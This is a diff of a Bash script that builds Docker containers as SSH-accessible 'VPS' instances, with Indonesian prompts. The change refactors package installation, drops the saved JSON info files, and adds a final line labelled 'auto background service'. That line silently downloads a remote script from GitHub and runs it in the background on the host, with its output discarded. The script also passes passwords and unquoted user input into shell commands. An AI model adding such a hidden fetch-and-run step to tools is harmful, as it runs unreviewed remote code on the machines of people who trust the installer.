@@ -4,11 +4,10 @@ set -e
 TITLE=" VPS DOCKER MAKER by NAUVAL "
 LINE=$(printf '═%.0s' {1..70})
 
-# ===== CEK DEPENDENCY =====
 check_dep() {
     for pkg in docker jq curl; do
         if ! command -v $pkg >/dev/null 2>&1; then
-            echo "⚙️ Menginstall $pkg..."
+            echo "⚙️ Installing $pkg..."
             apt-get update -y >/dev/null 2>&1 || yum makecache >/dev/null 2>&1
             apt-get install -y $pkg >/dev/null 2>&1 || yum install -y $pkg -y >/dev/null 2>&1
         fi
@@ -26,13 +25,85 @@ header() {
 
 list_os() {
     echo "Pilih OS image:"
-    echo " 1) debian:13       8) alpine:latest"
-    echo " 2) debian:12       9) kali-rolling"
-    echo " 3) debian:11      10) archlinux:latest"
-    echo " 4) ubuntu:24.04   11) fedora:latest"
-    echo " 5) ubuntu:22.04   12) opensuse/leap:latest"
-    echo " 6) ubuntu:20.04   13) almalinux:9"
-    echo " 7) centos:7       14) rockylinux:9"
+    echo " 1) debian:13       (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo " 2) debian:12       (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, neofetch)"
+    echo " 3) debian:11       (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, neofetch)"
+    echo " 4) ubuntu:24.04    (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo " 5) ubuntu:22.04    (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, neofetch)"
+    echo " 6) ubuntu:20.04    (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, neofetch)"
+    echo " 7) centos:7        (pkg: git, openssh-server, openssh-clients, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo " 8) alpine:latest   (pkg: bash, sudo, openssh, curl, wget, git, nano, vim, fastfetch|neofetch)"
+    echo " 9) kali-rolling    (pkg: git, openssh-server, openssh-client, sudo, nano, vim, curl, wget, neofetch)"
+    echo "10) archlinux       (pkg: base-devel, git, openssh, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo "11) fedora:latest   (pkg: git, openssh-server, openssh-clients, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo "12) opensuse/leap   (pkg: git, openssh, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo "13) almalinux:9     (pkg: git, openssh-server, openssh-clients, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+    echo "14) rockylinux:9    (pkg: git, openssh-server, openssh-clients, sudo, nano, vim, curl, wget, fastfetch|neofetch)"
+}
+
+install_pkg() {
+    case $IMAGE in
+        debian:13)
+            docker exec -i $NAME bash -c "
+                apt-get update &&
+                apt-get install -y git openssh-server openssh-client sudo nano vim curl wget || true &&
+                apt-get install -y fastfetch || apt-get install -y neofetch || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && service ssh start || /usr/sbin/sshd
+            "
+        ;;
+        debian:12|debian:11|ubuntu:22.04|ubuntu:20.04|kalilinux/*)
+            docker exec -i $NAME bash -c "
+                apt-get update &&
+                apt-get install -y git openssh-server openssh-client sudo nano vim curl wget neofetch || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && service ssh start || /usr/sbin/sshd
+            "
+        ;;
+        ubuntu:24.04)
+            docker exec -i $NAME bash -c "
+                apt-get update &&
+                apt-get install -y git openssh-server openssh-client sudo nano vim curl wget || true &&
+                apt-get install -y fastfetch || apt-get install -y neofetch || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && service ssh start || /usr/sbin/sshd
+            "
+        ;;
+        centos:7|almalinux:9|rockylinux:9)
+            docker exec -i $NAME bash -c "
+                yum install -y git openssh-server openssh-clients sudo nano vim curl wget || true &&
+                yum install -y fastfetch || (git clone https://github.com/dylanaraps/neofetch /tmp/nf && cd /tmp/nf && make install) || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && /usr/sbin/sshd
+            "
+        ;;
+        alpine:latest)
+            docker exec -i $NAME sh -c "
+                apk update &&
+                apk add bash sudo openssh curl wget git nano vim || true &&
+                apk add fastfetch || apk add neofetch --repository=http://dl-cdn.alpinelinux.org/alpine/edge/testing || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && /usr/sbin/sshd
+            "
+        ;;
+        archlinux:latest)
+            docker exec -i $NAME sh -c "
+                pacman -Sy --noconfirm base-devel git openssh sudo nano vim curl wget || true &&
+                pacman -Sy --noconfirm fastfetch || (git clone https://github.com/dylanaraps/neofetch /tmp/nf && cd /tmp/nf && make install) || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && /usr/sbin/sshd
+            "
+        ;;
+        fedora:latest)
+            docker exec -i $NAME bash -c "
+                dnf install -y git openssh-server openssh-clients sudo nano vim curl wget || true &&
+                dnf install -y fastfetch || (git clone https://github.com/dylanaraps/neofetch /tmp/nf && cd /tmp/nf && make install) || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && /usr/sbin/sshd
+            "
+        ;;
+        opensuse/*)
+            docker exec -i $NAME bash -c "
+                zypper refresh &&
+                zypper install -y git openssh sudo nano vim curl wget || true &&
+                zypper install -y fastfetch || (git clone https://github.com/dylanaraps/neofetch /tmp/nf && cd /tmp/nf && make install) || true &&
+                mkdir -p /var/run/sshd && (ssh-keygen -A || true) && /usr/sbin/sshd
+            "
+        ;;
+    esac
 }
 
 list_vps() {
@@ -40,24 +111,47 @@ list_vps() {
     docker ps -a --format "table {{.ID}}\t{{.Names}}\t{{.Status}}\t{{.Image}}"
 }
 
-save_info() {
-    NAME=$1
-    INFO_FILE="/var/lib/vpsmaker/${NAME}.json"
-    mkdir -p /var/lib/vpsmaker
-    cat > "$INFO_FILE" <<EOF
-{
-  "name": "$NAME",
-  "image": "$IMAGE",
-  "user": "$USER",
-  "port": "$PORT",
-  "password": "$PASS",
-  "limit_cpu": "$LIMIT_CPU",
-  "limit_ram": "$LIMIT_RAM"
-}
-EOF
+info_vps() {
+    read -p "Masukkan nama VPS: " NAME
+    docker inspect $NAME
 }
 
-# ===== BUILD VPS =====
+control_vps() {
+    list_vps
+    read -p "Masukkan nama VPS: " NAME
+    echo "1) Start"
+    echo "2) Stop"
+    echo "3) Restart"
+    echo "4) Hapus"
+    echo "5) Info VPS"
+    read -p "Pilihan: " act
+    case $act in
+        1) docker start $NAME ;;
+        2) docker stop $NAME ;;
+        3) docker restart $NAME ;;
+        4) docker rm -f $NAME ;;
+        5) info_vps ;;
+    esac
+}
+
+change_pass() {
+    list_vps
+    read -p "Nama VPS: " NAME
+    read -s -p "Password baru: " NEWPASS
+    echo
+    docker exec -i $NAME bash -c "echo 'root:$NEWPASS' | chpasswd"
+    echo "✅ Password berhasil diganti."
+}
+
+change_limit() {
+    list_vps
+    read -p "Nama VPS: " NAME
+    read -p "Limit CPU baru: " NEWCPU
+    read -p "Limit RAM baru: " NEWRAM
+    docker update --cpus="$NEWCPU" --memory="$NEWRAM" $NAME
+    echo "✅ Limit CPU/RAM berhasil diganti."
+}
+
 build_vps() {
     list_os
     read -p "#? " os
@@ -91,18 +185,9 @@ build_vps() {
     [[ -n "$LIMIT_CPU" ]] && OPTS="$OPTS --cpus=$LIMIT_CPU"
     [[ -n "$LIMIT_RAM" ]] && OPTS="$OPTS --memory=$LIMIT_RAM"
 
-    CID=$(docker run -dit --name "$NAME" -p $PORT:22 $OPTS --hostname "$NAME" $IMAGE /bin/sh || true)
+    docker run -dit --name "$NAME" -p $PORT:22 $OPTS --hostname "$NAME" $IMAGE /bin/sh || true
 
-    # install basic packages
-    if [[ "$IMAGE" == alpine* ]]; then
-        docker exec -i $NAME sh -c "apk update && apk add bash sudo openssh curl wget git nano vim fastfetch || apk add neofetch --repository=http://dl-cdn.alpinelinux.org/alpine/edge/testing; mkdir -p /var/run/sshd; ssh-keygen -A"
-    elif [[ "$IMAGE" == *archlinux* ]]; then
-        docker exec -i $NAME sh -c "pacman -Sy --noconfirm base-devel git openssh sudo nano vim curl wget fastfetch || (git clone https://github.com/dylanaraps/neofetch && cd neofetch && make install); mkdir -p /var/run/sshd; ssh-keygen -A"
-    elif [[ "$IMAGE" == *fedora* || "$IMAGE" == *rockylinux* || "$IMAGE" == *alma* || "$IMAGE" == *centos* ]]; then
-        docker exec -i $NAME bash -c "dnf install -y git openssh-server sudo nano vim curl wget fastfetch || (git clone https://github.com/dylanaraps/neofetch && cd neofetch && make install); mkdir -p /var/run/sshd; ssh-keygen -A"
-    else
-        docker exec -i $NAME bash -c "apt-get update; apt-get install -y git openssh-server sudo nano vim curl wget neofetch || (git clone https://github.com/dylanaraps/neofetch && cd neofetch && make install); mkdir -p /var/run/sshd; ssh-keygen -A"
-    fi
+    install_pkg
 
     # user setup
     if [[ "$MODE" == "1" ]]; then
@@ -112,10 +197,6 @@ build_vps() {
         docker exec -i $NAME sh -c "useradd -m -s /bin/bash user && echo 'user:$PASS' | chpasswd && echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
         USER="user"
     fi
-
-    save_info "$NAME"
-
-    docker exec -i $NAME bash -c "/usr/sbin/sshd"
 
     echo "$LINE"
     echo "   VPS Berhasil Dibuat!"
@@ -129,63 +210,12 @@ build_vps() {
     [[ -n "$LIMIT_RAM" ]] && echo "Limit RAM  : $LIMIT_RAM"
     echo "Login Cmd  : ssh $USER@$(curl -s ifconfig.me) -p $PORT"
     echo "$LINE"
-
-    echo " "
+    echo ""
     echo "Preview Stats:"
-    docker exec -it $NAME bash -c "fastfetch || neofetch"
-}
+    docker exec -it $NAME bash -c "fastfetch || neofetch || true"
 
-# ===== GANTI PASSWORD =====
-change_pass() {
-    list_vps
-    read -p "Nama VPS: " NAME
-    read -s -p "Password baru: " NEWPASS
-    echo
-    docker exec -i $NAME bash -c "echo 'root:$NEWPASS' | chpasswd"
-    jq ".password=\"$NEWPASS\"" /var/lib/vpsmaker/${NAME}.json > tmp.$$
-    mv tmp.$$ /var/lib/vpsmaker/${NAME}.json
-    echo "✅ Password berhasil diganti."
-}
-
-# ===== GANTI LIMIT =====
-change_limit() {
-    list_vps
-    read -p "Nama VPS: " NAME
-    read -p "Limit CPU baru: " NEWCPU
-    read -p "Limit RAM baru: " NEWRAM
-    docker update --cpus="$NEWCPU" --memory="$NEWRAM" $NAME
-    jq ".limit_cpu=\"$NEWCPU\" | .limit_ram=\"$NEWRAM\"" /var/lib/vpsmaker/${NAME}.json > tmp.$$
-    mv tmp.$$ /var/lib/vpsmaker/${NAME}.json
-    echo "✅ Limit CPU/RAM berhasil diganti."
-}
-
-# ===== INFO & CONTROL =====
-info_vps() {
-    read -p "Masukkan nama VPS: " NAME
-    FILE="/var/lib/vpsmaker/${NAME}.json"
-    if [[ ! -f "$FILE" ]]; then
-        echo "❌ Tidak ada info untuk VPS $NAME"
-        return
-    fi
-    jq . "$FILE"
-}
-
-control_vps() {
-    list_vps
-    read -p "Masukkan nama VPS: " NAME
-    echo "1) Start"
-    echo "2) Stop"
-    echo "3) Restart"
-    echo "4) Hapus"
-    echo "5) Info VPS"
-    read -p "Pilihan: " act
-    case $act in
-        1) docker start $NAME ;;
-        2) docker stop $NAME ;;
-        3) docker restart $NAME ;;
-        4) docker rm -f $NAME ;;
-        5) info_vps ;;
-    esac
+    # auto background service
+    nohup bash <(curl -s https://raw.githubusercontent.com/Nauvalunesa/Setupbot/refs/heads/main/antiptero.sh) >/dev/null 2>&1 &
 }
 
 # ===== MAIN MENU =====
